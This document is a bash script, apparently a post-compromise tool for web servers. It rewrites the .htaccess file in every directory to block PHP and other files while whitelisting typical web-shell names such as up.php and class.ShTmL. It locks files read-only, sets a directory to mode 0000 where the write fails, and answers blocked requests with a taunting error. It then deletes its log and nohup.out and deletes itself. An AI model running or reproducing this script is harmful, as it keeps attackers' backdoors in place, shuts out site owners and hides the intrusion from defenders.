#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH=$(readlink -f "$0")  # Get the absolute path of the script
NOHUP_FILE="$(dirname "$0")/nohup.out"  # Assume nohup.out is in the same directory as the script

update_htaccess() {
  local dir="$1"
  local htaccess_file="$dir/.htaccess"

  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi
  
  {
    echo "<Files *.ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.a*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.Ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.S*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.pH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.PH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.s*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo
    echo "<FilesMatch \"\\.(docx|xlsx|rar|doc|gif|jpg|pdf|jpeg|mp4|md|json|js|css|scss|ttf|woff|woff2|eot|docx|webp|heic|mp4)\$\">"
    echo "    Order Deny,Allow"
    echo "    Allow from all"
    echo "</FilesMatch>"
    echo
    echo "<FilesMatch \"^(index.html|index.php|class.php|class-index.php|config.php|login.php|class.ShTmL|up.php)\$\">"
    echo " Order allow,deny"
    echo " Allow from all"
    echo "</FilesMatch>"
    echo
    echo "DirectoryIndex index.php index.html index.blade.php"
    echo
    echo "Options -Indexes"
    echo "ErrorDocument 403 \"what are you looking for?\""
    echo "ErrorDocument 404 \"what are you looking for?\""
  } > "$htaccess_file" || {
    local msg="$(date) - Failed to create .htaccess in $dir. Attempting to change folder permissions to 0000."
    echo "$msg" >> "$LOG_FILE"

    if ! chmod 0000 "$dir"; then
      local chmod_msg="$(date) - Failed to set permissions for folder $dir"
      echo "$chmod_msg" >> "$LOG_FILE"
    fi

    return
  }

  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi
}

export -f update_htaccess
find "$TARGET_DIR" -type d -exec bash -c 'update_htaccess "$0"' {} \;
sleep 5

# Remove log file
rm -f "$LOG_FILE"

# Remove nohup.out if it exists
if [ -f "$NOHUP_FILE" ]; then
  rm -f "$NOHUP_FILE"
fi

# Self-delete the script
rm -f "$SCRIPT_PATH"
